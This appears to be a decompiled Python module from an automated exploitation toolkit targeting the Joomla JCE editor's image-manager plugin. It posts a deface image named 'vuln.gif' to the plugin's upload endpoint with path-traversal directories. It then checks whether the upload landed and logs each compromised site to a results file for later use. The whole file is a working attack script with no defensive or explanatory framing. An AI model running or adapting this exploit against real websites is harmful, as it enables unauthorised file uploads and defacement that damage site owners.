# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Com_JCEindex.py
import requests
from Exploits import printModule
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Jce_Deface_image = 'files/vuln.gif'

def Exploit(site):
    try:
        fileDeface = {'Filedata': open(Jce_Deface_image, 'rb')}
        post_data = {'upload-dir': '../../','upload-overwrite': '0','action': 'upload'}
        Exp = 'http://' + site + '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
        Post = requests.post(Exp, files=fileDeface, data=post_data, timeout=5, headers=Headers)
        OtherMethod = '"text":"' + Jce_Deface_image.split('/')[1] + '"'
        if OtherMethod in str(Post.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/' + Jce_Deface_image.split('/')[1] + '\n')
            return printModule.returnYes(site, 'N/A', 'Com_JCE', 'Joomla')
        if OtherMethod not in str(Post.content):
            post_data2 = {'upload-dir': '../','upload-overwrite': '0','action': 'upload'}
            Post = requests.post(Exp, files=fileDeface, data=post_data2, timeout=5, headers=Headers)
            if OtherMethod in str(Post.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/images/' + Jce_Deface_image.split('/')[1] + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_JCE Index', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')

        else:
            return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')